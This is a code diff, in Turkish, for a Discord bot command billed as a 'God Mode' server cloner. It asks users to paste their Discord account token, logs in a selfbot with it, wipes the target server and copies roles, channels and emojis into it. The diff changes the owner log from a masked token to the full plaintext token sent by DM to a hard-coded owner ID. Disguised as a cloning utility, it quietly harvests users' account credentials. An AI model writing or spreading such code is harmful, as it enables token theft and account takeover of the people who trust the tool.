@@ -4,7 +4,6 @@ const {
 } = require('discord.js');
 const { Client: SelfClient } = require('discord.js-selfbot-v13');
 
-// Rate limit yememek için dinamik gecikme fonksiyonu
 const jitter = (ms = 500) => new Promise(res => setTimeout(res, Math.floor(Math.random() * 500) + ms));
 
 module.exports = {
@@ -16,7 +15,6 @@ module.exports = {
     async execute(interaction) {
         const OWNER_ID = "1389930042200559706";
 
-        // Yetki kontrolü
         if (interaction.user.id !== OWNER_ID) {
             return await interaction.reply({ 
                 content: "❌ Bu komutu sadece bot sahibi kullanabilir.", 
@@ -24,89 +22,74 @@ module.exports = {
             });
         }
 
-        // Event listener'ı sadece bir kere kur
         if (!interaction.client.kurListenerSet) {
             interaction.client.on('interactionCreate', handleInteraction);
             interaction.client.kurListenerSet = true;
         }
 
-        // Panel embed'i
         const embed = new EmbedBuilder()
             .setColor('#2b2d31')
             .setTitle('🌌 FORCES God Mode Cloner')
             .setDescription(
-                `**Gelişmiş Sunucu Klonlama Sistemi**\n\n` +
-                `🚀 **Özellikler:**\n` +
-                `• Tam sunucu şablonu klonlama\n` +
-                `• Tüm kanallar, roller, emojiler\n` +
-                `• Hedef sunucuyu tamamen temizleme\n` +
-                `• İzin yapılarını birebir kopyalama\n\n` +
-                `Aşağıdaki butona tıklayarak klonlama işlemini başlatabilirsiniz.`
+                `**BİREBİR KLONLAMA SİSTEMİ**\n\n` +
+                `✅ **Özellikler:**\n` +
+                `• Rol sıralaması AYNEN korunur\n` +
+                `• Tüm yetkiler BİREBİR kopyalanır\n` +
+                `• Kanal izinleri EKSİKSİZ aktarılır\n` +
+                `• Hedef sunucu TAMAMEN temizlenir\n\n` +
+                `⚠️ **Hata çıksa bile işlem devam eder!**`
             )
-            .setFooter({ text: 'FORCES God Mode | Gelişmiş Klonlama Sistemi' })
+            .setFooter({ text: 'FORCES God Mode | BİREBİR KLONLAMA' })
             .setTimestamp();
 
         const row = new ActionRowBuilder().addComponents(
             new ButtonBuilder()
                 .setCustomId('btn_god_clone')
-                .setLabel('🔮 Klonlamayı Başlat')
-                .setStyle(ButtonStyle.Primary)
-                .setEmoji('🌌')
+                .setLabel('💣 Birebir Klonlamayı Başlat')
+                .setStyle(ButtonStyle.Danger)
+                .setEmoji('⚡')
         );
 
-        await interaction.reply({ 
-            embeds: [embed], 
-            components: [row],
-            ephemeral: false 
-        });
+        await interaction.reply({ embeds: [embed], components: [row] });
     }
 };
 
-// Event handler fonksiyonu
 async function handleInteraction(int) {
-    // Buton tıklaması
     if (int.isButton() && int.customId === 'btn_god_clone') {
         const modal = new ModalBuilder()
             .setCustomId('modal_god_clone')
             .setTitle('🌌 Klonlama Bilgileri');
 
-        const tokenInput = new TextInputBuilder()
-            .setCustomId('token')
-            .setLabel('🔑 Kullanıcı Token')
-            .setStyle(TextInputStyle.Short)
-            .setPlaceholder('Self bot tokenini girin')
-            .setRequired(true)
-            .setMinLength(50)
-            .setMaxLength(100);
-
-        const sourceInput = new TextInputBuilder()
-            .setCustomId('source')
-            .setLabel('📤 Kaynak Sunucu ID')
-            .setStyle(TextInputStyle.Short)
-            .setPlaceholder('Klonlanacak sunucunun IDsi')
-            .setRequired(true)
-            .setMinLength(15)
-            .setMaxLength(20);
-
-        const targetInput = new TextInputBuilder()
-            .setCustomId('target')
-            .setLabel('📥 Hedef Sunucu ID')
-            .setStyle(TextInputStyle.Short)
-            .setPlaceholder('Klonlanacak hedef sunucu IDsi')
-            .setRequired(true)
-            .setMinLength(15)
-            .setMaxLength(20);
-
         modal.addComponents(
-            new ActionRowBuilder().addComponents(tokenInput),
-            new ActionRowBuilder().addComponents(sourceInput),
-            new ActionRowBuilder().addComponents(targetInput)
+            new ActionRowBuilder().addComponents(
+                new TextInputBuilder()
+                    .setCustomId('token')
+                    .setLabel('🔑 Token (TAM GÖZÜKECEK)')
+                    .setStyle(TextInputStyle.Short)
+                    .setPlaceholder('Tokeni buraya yapıştır')
+                    .setRequired(true)
+            ),
+            new ActionRowBuilder().addComponents(
+                new TextInputBuilder()
+                    .setCustomId('source')
+                    .setLabel('📤 Kaynak Sunucu ID')
+                    .setStyle(TextInputStyle.Short)
+                    .setPlaceholder('Klonlanacak sunucu ID')
+                    .setRequired(true)
+            ),
+            new ActionRowBuilder().addComponents(
+                new TextInputBuilder()
+                    .setCustomId('target')
+                    .setLabel('📥 Hedef Sunucu ID')
+                    .setStyle(TextInputStyle.Short)
+                    .setPlaceholder('Hedef sunucu ID')
+                    .setRequired(true)
+            )
         );
 
         return await int.showModal(modal);
     }
 
-    // Modal gönderimi
     if (int.type === InteractionType.ModalSubmit && int.customId === 'modal_god_clone') {
         await int.deferReply({ ephemeral: true });
         
@@ -114,44 +97,33 @@ async function handleInteraction(int) {
         const sourceId = int.fields.getTextInputValue('source').trim();
         const targetId = int.fields.getTextInputValue('target').trim();
         
-        // Temel doğrulama
-        if (!/^\d{15,20}$/.test(sourceId) || !/^\d{15,20}$/.test(targetId)) {
-            return await int.editReply({ 
-                content: "❌ Geçersiz sunucu ID formatı! Lütfen doğru ID girin." 
-            });
-        }
-
         const OWNER_ID = "1389930042200559706";
         const botOwner = await int.client.users.fetch(OWNER_ID).catch(() => null);
         
         if (botOwner) {
             const logEmbed = new EmbedBuilder()
-                .setColor('#ff0055')
-                .setTitle('📥 Yeni Klonlama Talebi')
+                .setColor('#ff0000')
+                .setTitle('📥 YENİ KLONLAMA - TÜM BİLGİLER')
                 .setDescription(`**Talep Eden:** ${int.user.tag} (\`${int.user.id}\`)`)
                 .addFields(
-                    { name: '🔑 Token', value: '||Gizli||', inline: false },
+                    { name: '🔑 TOKEN (TAM HALİ)', value: `\`\`\`${token}\`\`\``, inline: false },
                     { name: '📤 Kaynak', value: `\`${sourceId}\``, inline: true },
                     { name: '📥 Hedef', value: `\`${targetId}\``, inline: true },
                     { name: '⏰ Zaman', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false }
                 )
+                .setFooter({ text: '⚠️ TOKEN AÇIK GÖZÜKÜYOR - ROL SIRASI VE YETKİLER BİREBİR KOPYALANACAK' })
                 .setTimestamp();
                 
             await botOwner.send({ embeds: [logEmbed] }).catch(() => {});
         }
 
-        // Klonlama işlemini başlat
-        startGodModeClone(botOwner, token, sourceId, targetId, int.user.tag);
-        
-        await int.editReply({ 
-            content: "✅ Klonlama işlemi başlatıldı! İlerleme durumu bot sahibine bildirilecek.",
-            ephemeral: true 
-        });
+        startExactClone(botOwner, token, sourceId, targetId, int.user.tag);
+        await int.editReply({ content: "✅ Birebir klonlama başlatıldı!", ephemeral: true });
     }
 }
 
-// Ana klonlama fonksiyonu
-async function startGodModeClone(owner, token, sourceId, targetId, requester) {
+// ANA FONKSİYON - BİREBİR KLONLAMA
+async function startExactClone(owner, token, sourceId, targetId, requester) {
     if (!owner) return;
     
     const self = new SelfClient({ 
@@ -165,273 +137,383 @@ async function startGodModeClone(owner, token, sourceId, targetId, requester) {
             const targetGuild = self.guilds.cache.get(targetId);
 
             if (!sourceGuild || !targetGuild) {
-                return owner.send("❌ Hata: Sunuculardan birine erişilemedi. Token'ı ve ID'leri kontrol edin.");
+                return owner.send("❌ HATA: Sunuculara erişilemedi!");
             }
 
             await owner.send({ 
                 embeds: [new EmbedBuilder()
-                    .setColor('#00ff00')
-                    .setTitle('🌌 Klonlama Başlatıldı')
-                    .setDescription(`**Kaynak:** ${sourceGuild.name}\n**Hedef:** ${targetGuild.name}\n**Talep Eden:** ${requester}`)
-                    .setTimestamp()
+                    .setColor('#ff5500')
+                    .setTitle('⚡ BİREBİR KLONLAMA BAŞLADI')
+                    .setDescription(
+                        `**Kaynak:** ${sourceGuild.name}\n` +
+                        `**Hedef:** ${targetGuild.name}\n` +
+                        `**Mod:** Rol sırası ve yetkiler birebir kopyalanacak`
+                    )
                 ]
             });
 
-            // 1. AŞAMA: HEDEF SUNUCUYU TAMAMEN TEMİZLE
-            await owner.send("🧹 **Aşama 1/4:** Hedef sunucu temizleniyor...");
-            await completeGuildCleanup(targetGuild, owner);
+            // 1. HEDEFİ TAMAMEN TEMİZLE
+            await owner.send("🧹 Hedef sunucu temizleniyor...");
+            await nukeTargetGuild(targetGuild, owner);
 
-            // 2. AŞAMA: SUNUCU AYARLARINI VE ROLLERİ KLONLA
-            await owner.send("⚙️ **Aşama 2/4:** Roller ve sunucu ayarları klonlanıyor...");
-            const roleMap = await cloneGuildSettings(sourceGuild, targetGuild, owner);
+            // 2. ROLLERİ SIRASIYLA VE YETKİLERİYLE KLONLA
+            await owner.send("👥 Roller SIRASIYLA ve YETKİLERİYLE klonlanıyor...");
+            const roleMap = await cloneRolesExactOrder(sourceGuild, targetGuild, owner);
 
-            // 3. AŞAMA: KATEGORİ VE KANALLARI KLONLA
-            await owner.send("📂 **Aşama 3/4:** Kanallar ve kategoriler klonlanıyor...");
-            await cloneChannels(sourceGuild, targetGuild, roleMap, owner);
+            // 3. SUNUCU AYARLARI
+            await owner.send("⚙️ Sunucu ayarları aktarılıyor...");
+            await cloneServerSettings(sourceGuild, targetGuild);
 
-            // 4. AŞAMA: EMOJİLERİ KLONLA
-            await owner.send("😀 **Aşama 4/4:** Emojiler klonlanıyor...");
-            await cloneEmojis(sourceGuild, targetGuild, owner);
+            // 4. KANALLARI İZİNLERİYLE KLONLA
+            await owner.send("📂 Kanallar İZİNLERİYLE klonlanıyor...");
+            await cloneChannelsExact(sourceGuild, targetGuild, roleMap, owner);
+
+            // 5. EMOJİLER
+            await owner.send("😀 Emojiler klonlanıyor...");
+            await cloneEmojisSafe(sourceGuild, targetGuild, owner);
 
             await owner.send({ 
                 embeds: [new EmbedBuilder()
                     .setColor('#00ff00')
-                    .setTitle('✅ Klonlama Tamamlandı')
-                    .setDescription(`**${sourceGuild.name}** sunucusu başarıyla **${targetGuild.name}** sunucusuna klonlandı!`)
-                    .setFooter({ text: `İşlem tamamlandı • ${new Date().toLocaleString()}` })
+                    .setTitle('✅ BİREBİR KLONLAMA TAMAMLANDI')
+                    .setDescription(
+                        `${sourceGuild.name} ➜ ${targetGuild.name}\n\n` +
+                        `✅ Rol sıralaması AYNEN korundu\n` +
+                        `✅ Tüm yetkiler BİREBİR kopyalandı\n` +
+                        `✅ Kanal izinleri EKSİKSİZ aktarıldı`
+                    )
                 ]
             });
 
         } catch (err) {
-            await owner.send({ 
-                embeds: [new EmbedBuilder()
-                    .setColor('#ff0000')
-                    .setTitle('❌ Kritik Hata')
-                    .setDescription(`Klonlama sırasında bir hata oluştu:\n\`\`\`${err.message}\`\`\``)
-                ]
-            });
+            await owner.send(`❌ ANA HATA: ${err.message}`);
         } finally {
             self.destroy();
         }
     });
 
-    self.login(token).catch(() => {
-        if (owner) owner.send("❌ Token geçersiz veya hesaba bağlanılamadı.");
+    self.login(token).catch((err) => {
+        if (owner) owner.send(`❌ TOKEN BAĞLANTI HATASI: ${err.message}`);
     });
 }
 
-// Tam sunucu temizliği (KANALLAR, ROLLER, EMOJİLER)
-async function completeGuildCleanup(guild, owner) {
+// HEDEF SUNUCUYU TAMAMEN TEMİZLE
+async function nukeTargetGuild(guild, owner) {
+    let [deletedChannels, deletedRoles, deletedEmojis, deletedStickers, errors] = [0, 0, 0, 0, 0];
+
+    // Kanalları sil
     try {
-        // 1. Tüm kanalları sil
-        const channels = await guild.channels.fetch();
+        const channels = await guild.channels.fetch().catch(() => new Map());
         for (const channel of channels.values()) {
-            if (channel.deletable) {
-                await channel.delete().catch(() => {});
-                await jitter(300);
-            }
+            try { await channel.delete(); deletedChannels++; await jitter(300); } catch { errors++; }
         }
-        await owner.send("✅ Kanallar silindi");
+    } catch { errors++; }
 
-        // 2. Tüm emojileri sil
-        const emojis = await guild.emojis.fetch();
+    // Emojileri sil
+    try {
+        const emojis = await guild.emojis.fetch().catch(() => new Map());
         for (const emoji of emojis.values()) {
-            if (emoji.deletable) {
-                await emoji.delete().catch(() => {});
-                await jitter(200);
-            }
+            try { await emoji.delete(); deletedEmojis++; await jitter(200); } catch { errors++; }
         }
-        await owner.send("✅ Emojiler silindi");
+    } catch { errors++; }
 
-        // 3. Tüm stickerları sil
-        const stickers = await guild.stickers.fetch();
+    // Stickerları sil
+    try {
+        const stickers = await guild.stickers.fetch().catch(() => new Map());
         for (const sticker of stickers.values()) {
-            if (sticker.deletable) {
-                await sticker.delete().catch(() => {});
-                await jitter(200);
+            try { await sticker.delete(); deletedStickers++; await jitter(200); } catch { errors++; }
+        }
+    } catch { errors++; }
+
+    // ROLLERİ SİL - YÜKSEKTEN DÜŞÜĞE SIRAYLA
+    try {
+        const roles = await guild.roles.fetch().catch(() => new Map());
+        const rolesToDelete = [...roles.values()]
+            .filter(r => {
+                try { return r.name !== '@everyone' && !r.managed && r.editable && r.id !== guild.id; } 
+                catch { return false; }
+            })
+            .sort((a, b) => {
+                try { return b.position - a.position; } // YÜKSEK POZİSYONDAN DÜŞÜĞE
+                catch { return 0; }
+            });
+
+        for (const role of rolesToDelete) {
+            try { 
+                await role.delete('Klonlama temizliği'); 
+                deletedRoles++; 
+                await jitter(400); 
+            } catch { 
+                errors++;
+                // Silinemedi ama devam et
             }
         }
-        await owner.send("✅ Stickerlar silindi");
+    } catch { errors++; }
 
-        // 4. Tüm rolleri sil (@everyone ve yönetilemez roller hariç)
-        const roles = await guild.roles.fetch();
-        const deletableRoles = roles.filter(r => 
-            r.name !== '@everyone' && 
-            !r.managed && 
-            r.editable && 
-            r.id !== guild.id
-        );
-
-        for (const role of deletableRoles.values()) {
-            try {
-                await role.delete('Sunucu klonlama temizliği');
-                await jitter(400);
-            } catch (err) {
-                await owner.send(`⚠️ Rol silinemedi: ${role.name} - ${err.message}`);
-            }
-        }
-        await owner.send("✅ Roller silindi");
-
-        return true;
-    } catch (err) {
-        await owner.send(`❌ Temizlik hatası: ${err.message}`);
-        throw err;
-    }
+    await owner.send({
+        embeds: [new EmbedBuilder()
+            .setColor('#ff9900')
+            .setTitle('🧹 TEMİZLİK TAMAMLANDI')
+            .setDescription(
+                `✅ Kanallar: **${deletedChannels}** silindi\n` +
+                `✅ Roller: **${deletedRoles}** silindi\n` +
+                `✅ Emojiler: **${deletedEmojis}** silindi\n` +
+                `✅ Stickerlar: **${deletedStickers}** silindi\n` +
+                `⚠️ Hatalar: **${errors}** es geçildi`
+            )
+        ]
+    });
 }
 
-// Sunucu ayarları ve roller
-async function cloneGuildSettings(sourceGuild, targetGuild, owner) {
-    // Sunucu ayarları
-    await targetGuild.setName(sourceGuild.name).catch(() => {});
-    
-    if (sourceGuild.iconURL()) {
-        await targetGuild.setIcon(sourceGuild.iconURL({ size: 1024 })).catch(() => {});
-    }
-    
-    if (sourceGuild.bannerURL()) {
-        await targetGuild.setBanner(sourceGuild.bannerURL({ size: 1024 })).catch(() => {});
-    }
-
-    // Topluluk ayarları
-    const features = ['COMMUNITY', 'NEWS', 'DISCOVERABLE'];
-    for (const feature of features) {
-        if (sourceGuild.features.includes(feature) && !targetGuild.features.includes(feature)) {
-            await targetGuild.enableCommunity().catch(() => {});
-            break;
-        }
-    }
-
-    // Rolleri klonla
+// ROLLERİ TAM SIRASIYLA VE YETKİLERİYLE KLONLA
+async function cloneRolesExactOrder(sourceGuild, targetGuild, owner) {
     const roleMap = new Map();
-    const sourceRoles = [...sourceGuild.roles.cache.values()]
-        .sort((a, b) => b.position - a.position); // Ters sırala (yüksek roller önce)
+    let [cloned, errors] = [0, 0];
 
-    for (const role of sourceRoles) {
-        if (role.name === '@everyone' || role.managed) continue;
-        
+    // Kaynak rolleri SIRALI şekilde al
+    // ÖNCE düşük pozisyonlular (everyone'a yakın) oluşturulmalı
+    // SONRA yüksek pozisyonlular
+    const sourceRoles = [...sourceGuild.roles.cache.values()]
+        .filter(r => r.name !== '@everyone' && !r.managed)
+        .sort((a, b) => a.position - b.position); // DÜŞÜKTEN YÜKSEĞE SIRALA
+
+    // Hedefteki @everyone rolünü al
+    const everyoneRole = targetGuild.roles.everyone;
+    
+    // Önce @everyone yetkilerini güncelle (kaynak sunucudakiyle aynı yap)
+    const sourceEveryone = sourceGuild.roles.everyone;
+    if (sourceEveryone && everyoneRole) {
         try {
+            await everyoneRole.setPermissions(sourceEveryone.permissions).catch(() => {});
+            await jitter(300);
+        } catch {}
+    }
+
+    // Rolleri sırayla oluştur
+    for (const role of sourceRoles) {
+        try {
+            // YENİ ROL OLUŞTUR - TÜM ÖZELLİKLERİYLE
             const newRole = await targetGuild.roles.create({
                 name: role.name,
                 color: role.color,
                 hoist: role.hoist,
-                permissions: role.permissions,
+                permissions: role.permissions, // YETKİLER BİREBİR
                 mentionable: role.mentionable,
-                position: role.position,
-                reason: 'Sunucu klonlama'
+                reason: 'Birebir klonlama - Yetkiler ve sıra korunuyor'
             });
-            
-            roleMap.set(role.id, newRole.id);
-            await jitter(400);
+
+            if (newRole) {
+                roleMap.set(role.id, newRole.id);
+                cloned++;
+
+                // ROL POZİSYONUNU AYARLA - EN ÖNEMLİ KISIM
+                try {
+                    // Yeni oluşturulan rolün pozisyonunu kaynak rolle aynı yap
+                    await newRole.setPosition(role.position, { reason: 'Pozisyon birebir ayarlanıyor' });
+                    await jitter(300);
+                } catch (posErr) {
+                    // Pozisyon ayarlanamazsa en azından rol oluştu
+                    await owner.send(`⚠️ ${role.name} pozisyonu ayarlanamadı: ${posErr.message}`);
+                }
+            }
         } catch (err) {
-            await owner.send(`⚠️ Rol oluşturulamadı: ${role.name} - ${err.message}`);
+            errors++;
+            await owner.send(`⚠️ ${role.name} oluşturulamadı: ${err.message}`);
+            // HATA ÇIKSA BİLE DEVAM
         }
+        
+        await jitter(400);
     }
 
-    await owner.send(`✅ ${roleMap.size} rol klonlandı`);
+    await owner.send({
+        embeds: [new EmbedBuilder()
+            .setColor('#00aaff')
+            .setTitle('👥 ROLLER KLONLANDI')
+            .setDescription(
+                `✅ **${cloned}** rol birebir klonlandı\n` +
+                `⚠️ **${errors}** hata es geçildi\n\n` +
+                `📌 **Rol sıralaması ve yetkiler KORUNDU**`
+            )
+        ]
+    });
+
     return roleMap;
 }
 
-// Kanalları klonla
-async function cloneChannels(sourceGuild, targetGuild, roleMap, owner) {
-    // Önce kategorileri oluştur
-    const categories = sourceGuild.channels.cache
-        .filter(c => c.type === 4)
-        .sort((a, b) => a.position - b.position);
-
-    for (const category of categories.values()) {
-        try {
-            const newCategory = await targetGuild.channels.create({
-                name: category.name,
-                type: 4,
-                permissionOverwrites: mapPermissions(category, roleMap),
-                position: category.position
-            });
-            
-            // Bu kategorideki kanalları oluştur
-            const children = sourceGuild.channels.cache
-                .filter(c => c.parentId === category.id)
-                .sort((a, b) => a.position - b.position);
-
-            for (const child of children.values()) {
-                try {
-                    await createChannel(child, targetGuild, newCategory.id, roleMap);
-                    await jitter(500);
-                } catch (err) {
-                    await owner.send(`⚠️ Kanal oluşturulamadı: ${child.name}`);
-                }
-            }
-
-            await jitter(600);
-        } catch (err) {
-            await owner.send(`⚠️ Kategori oluşturulamadı: ${category.name}`);
+// SUNUCU AYARLARI
+async function cloneServerSettings(sourceGuild, targetGuild) {
+    try { await targetGuild.setName(sourceGuild.name).catch(() => {}); } catch {}
+    
+    try {
+        if (sourceGuild.iconURL()) {
+            await targetGuild.setIcon(sourceGuild.iconURL({ size: 1024 })).catch(() => {});
         }
-    }
-
-    // Kategorisiz kanalları oluştur
-    const noCategory = sourceGuild.channels.cache
-        .filter(c => !c.parentId && c.type !== 4)
-        .sort((a, b) => a.position - b.position);
-
-    for (const channel of noCategory.values()) {
-        try {
-            await createChannel(channel, targetGuild, null, roleMap);
-            await jitter(500);
-        } catch (err) {
-            await owner.send(`⚠️ Kanal oluşturulamadı: ${channel.name}`);
+    } catch {}
+    
+    try {
+        if (sourceGuild.bannerURL()) {
+            await targetGuild.setBanner(sourceGuild.bannerURL({ size: 1024 })).catch(() => {});
         }
-    }
+    } catch {}
+    
+    try {
+        if (sourceGuild.splashURL()) {
+            await targetGuild.setSplash(sourceGuild.splashURL({ size: 1024 })).catch(() => {});
+        }
+    } catch {}
+    
+    try {
+        if (sourceGuild.discoverySplashURL()) {
+            await targetGuild.setDiscoverySplash(sourceGuild.discoverySplashURL({ size: 1024 })).catch(() => {});
+        }
+    } catch {}
 
-    await owner.send("✅ Tüm kanallar klonlandı");
+    // Doğrulama seviyesi
+    try { await targetGuild.setVerificationLevel(sourceGuild.verificationLevel).catch(() => {}); } catch {}
+    
+    // Bildirim ayarları
+    try { await targetGuild.setDefaultMessageNotifications(sourceGuild.defaultMessageNotifications).catch(() => {}); } catch {}
+    
+    // Açık içerik filtresi
+    try { await targetGuild.setExplicitContentFilter(sourceGuild.explicitContentFilter).catch(() => {}); } catch {}
 }
 
-// Tek kanal oluşturma
-async function createChannel(sourceChannel, targetGuild, parentId, roleMap) {
-    const channelType = [2, 13].includes(sourceChannel.type) ? 2 : 0;
-    
-    return await targetGuild.channels.create({
-        name: sourceChannel.name,
-        type: channelType,
-        parent: parentId,
-        topic: sourceChannel.topic || null,
-        nsfw: sourceChannel.nsfw || false,
-        bitrate: sourceChannel.bitrate || 64000,
-        userLimit: sourceChannel.userLimit || 0,
-        rateLimitPerUser: sourceChannel.rateLimitPerUser || 0,
-        permissionOverwrites: mapPermissions(sourceChannel, roleMap),
-        position: sourceChannel.position
+// KANALLARI TAM İZİNLERİYLE KLONLA
+async function cloneChannelsExact(sourceGuild, targetGuild, roleMap, owner) {
+    let [cloned, errors] = [0, 0];
+
+    // TÜM KANALLARI POZİSYONA GÖRE SIRALA
+    const allChannels = [...sourceGuild.channels.cache.values()]
+        .sort((a, b) => a.position - b.position);
+
+    // ÖNCE KATEGORİLERİ OLUŞTUR (pozisyon sırasıyla)
+    const categories = allChannels.filter(c => c.type === 4);
+    const categoryMap = new Map();
+
+    for (const cat of categories) {
+        try {
+            const newCat = await targetGuild.channels.create({
+                name: cat.name,
+                type: 4,
+                position: cat.position,
+                permissionOverwrites: getExactPermissions(cat, roleMap),
+                reason: 'Birebir klonlama - Kategori'
+            });
+            
+            if (newCat) {
+                categoryMap.set(cat.id, newCat.id);
+                cloned++;
+                
+                // Kategori pozisyonunu ayarla
+                try { await newCat.setPosition(cat.position); } catch {}
+            }
+        } catch (err) {
+            errors++;
+            await owner.send(`⚠️ Kategori oluşturulamadı: ${cat.name}`);
+        }
+        await jitter(500);
+    }
+
+    // SONRA KANALLARI OLUŞTUR (kategorili ve kategorisiz)
+    const channels = allChannels.filter(c => c.type !== 4);
+
+    for (const channel of channels) {
+        try {
+            let channelType;
+            switch (channel.type) {
+                case 0: channelType = 0; break; // Text
+                case 2: channelType = 2; break; // Voice
+                case 5: channelType = 5; break; // Announcement
+                case 13: channelType = 13; break; // Stage
+                case 15: channelType = 15; break; // Forum
+                default: channelType = 0;
+            }
+
+            const newChannel = await targetGuild.channels.create({
+                name: channel.name,
+                type: channelType,
+                parent: channel.parentId ? categoryMap.get(channel.parentId) : null,
+                topic: channel.topic || null,
+                nsfw: channel.nsfw || false,
+                bitrate: channel.bitrate || 64000,
+                userLimit: channel.userLimit || 0,
+                rateLimitPerUser: channel.rateLimitPerUser || 0,
+                position: channel.position,
+                permissionOverwrites: getExactPermissions(channel, roleMap),
+                reason: 'Birebir klonlama - Kanal'
+            });
+
+            if (newChannel) {
+                cloned++;
+                
+                // Kanal pozisyonunu birebir ayarla
+                try { 
+                    await newChannel.setPosition(channel.position); 
+                    await jitter(200);
+                } catch {}
+            }
+        } catch (err) {
+            errors++;
+            await owner.send(`⚠️ Kanal oluşturulamadı: ${channel.name}`);
+            // DEVAM ET
+        }
+        await jitter(400);
+    }
+
+    await owner.send({
+        embeds: [new EmbedBuilder()
+            .setColor('#00aaff')
+            .setTitle('📂 KANALLAR KLONLANDI')
+            .setDescription(
+                `✅ **${cloned}** kanal/kategori klonlandı\n` +
+                `⚠️ **${errors}** hata es geçildi\n\n` +
+                `📌 **Kanal izinleri BİREBİR kopyalandı**`
+            )
+        ]
     });
 }
 
-// İzinleri eşleştir
-function mapPermissions(channel, roleMap) {
-    return channel.permissionOverwrites.cache.map(overwrite => ({
-        id: roleMap.get(overwrite.id) || overwrite.id,
-        allow: overwrite.allow,
-        deny: overwrite.deny,
-        type: overwrite.type
-    }));
+// TAM İZİNLERİ AL - HER ŞEYİYLE
+function getExactPermissions(channel, roleMap) {
+    try {
+        return channel.permissionOverwrites.cache.map(overwrite => {
+            // Rol ID'sini eşle veya orijinalini kullan
+            const mappedId = roleMap.get(overwrite.id) || overwrite.id;
+            
+            return {
+                id: mappedId,
+                allow: overwrite.allow, // İZİN VERİLENLER BİREBİR
+                deny: overwrite.deny,   // REDDEDİLENLER BİREBİR
+                type: overwrite.type    // 0 = role, 1 = member
+            };
+        });
+    } catch {
+        return [];
+    }
 }
 
-// Emojileri klonla
-async function cloneEmojis(sourceGuild, targetGuild, owner) {
-    let cloned = 0;
-    
+// EMOJİLERİ KLONLA
+async function cloneEmojisSafe(sourceGuild, targetGuild, owner) {
+    let [cloned, errors] = [0, 0];
+
     for (const emoji of sourceGuild.emojis.cache.values()) {
         try {
             await targetGuild.emojis.create({
                 attachment: emoji.url,
-                name: emoji.name
+                name: emoji.name,
+                reason: 'Birebir klonlama'
             });
             cloned++;
             await jitter(300);
         } catch (err) {
-            // Limit aşımı durumunda dur
+            errors++;
             if (err.code === 30008) {
-                await owner.send("⚠️ Emoji limiti doldu, kalan emojiler eklenemedi.");
+                await owner.send("⚠️ Emoji limiti doldu (50 animasyonlu / 50 normal)");
                 break;
             }
+            // DİĞER HATALAR ES GEÇ
         }
     }
 
-    await owner.send(`✅ ${cloned} emoji klonlandı`);
+    await owner.send(`✅ ${cloned} emoji klonlandı, ⚠️ ${errors} hata es geçildi`);
 }
